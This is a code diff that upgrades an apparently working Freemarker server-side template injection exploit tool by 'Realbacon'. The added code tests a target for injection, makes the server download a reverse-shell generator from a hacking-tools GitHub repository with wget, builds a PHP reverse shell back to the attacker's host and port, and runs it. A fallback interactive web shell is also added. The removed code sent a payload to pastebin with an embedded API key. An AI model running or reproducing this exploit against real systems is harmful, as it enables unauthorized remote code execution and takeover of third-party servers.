@@ -1,10 +1,6 @@
 import argparse
 import requests
 from datetime import datetime
-import autorev
-import subprocess
-import shlex
-import os
 
 
 # functions
@@ -24,7 +20,7 @@ def inject(payload):
     return p.text
 
 
-print('		Freemarker template injection made by Realbacon v1.0\n\n')
+print('		Freemarker template injection made by Realbacon v2.0\n\n')
 
 # parsing arguments
 parser = argparse.ArgumentParser(description='All this arguments are required :')
@@ -65,7 +61,7 @@ payload_test = requests.post(args.url, data=data_test)
 
 
 if response(payload_test.text) == '$baconed$':
-    print('[+] Injection successfull\n[+] Opening shell')
+    print('[+] Injection successfull\n[+] Opening webshell')
 else:
     # We dont get a response so we close the program
     print("[-]Target does not seem to be injectable...\n[-]Aborting...")
@@ -77,17 +73,36 @@ now = datetime.now()
 time_display = now.strftime("%d/%m/%Y %H:%M:%S")
 
 # open the shell
-print(f'\n[+] Shell opened at {time_display}\n[+] Check your netcat window')
+print(f'\n[+] Web shell opened at {time_display}\n[+] Injecting payload generator...')
 
-payload = autorev.create(lhost,lport)
-api = f"bacon='{payload}'; curl -d 'api_paste_code=$bacon' 'https://pastebin.com/api/api_post.php' -d 'api_dev_key=8YVBhzemNtfyF_HPSVEUMDtqm_MOP3Sc' -X POST -d 'api_option=paste'"
+inject('wget -O /tmp/revgen.py https://raw.githubusercontent.com/evilcater/H4cX/master/Tools/auto_reverse_shell/autorev.py')
 
-a = os.popen(api)
-read = a.read()
-print(read)
+if response(inject('file /tmp/revgen.py')) == '/tmp/revgen.py: ASCII text, with very long lines':
+	print('[+] Payload generator injected')
+else:
+	print("[-] Unable to inject payload generator, maybe /tmp is not writtable. Do you want to open a webshell ? (limited functionalites) y/n")
+	ask = input('>')
+	if ask == 'n': exit()
+	while True:
+		user_data = input(f'{response(inject("whoami"))}${response(inject("pwd"))} - ')
+		if user_data == 'exit': exit()
+		print(response(inject(user_data)))
+    
+inject(f'python3 /tmp/revgen.py {lhost} {lport} realexploit.php')
+
+if response(inject('file /tmp/realexploit.php')) == '/tmp/realexploit.php: PHP script, ASCII text, with very long lines':
+	print('[+] Payload created !')
+else:
+	print("[-] Unable to create payload,maybe the server does not run python3. Do you want to open a webshell ? (limited functionalites) y/n")
+	ask = input('>')
+	if ask == 'n': exit()
+	while True:
+		user_data = input(f'{response(inject("whoami"))}${response(inject("pwd"))} - ')
+		if user_data == 'exit': exit()
+		print(response(inject(user_data)))
 
 
-
-
+print('[+] Launching the script : php -f /tmp/realexploit.php...')
+inject('php -f /tmp/realexploit.php')
 
 
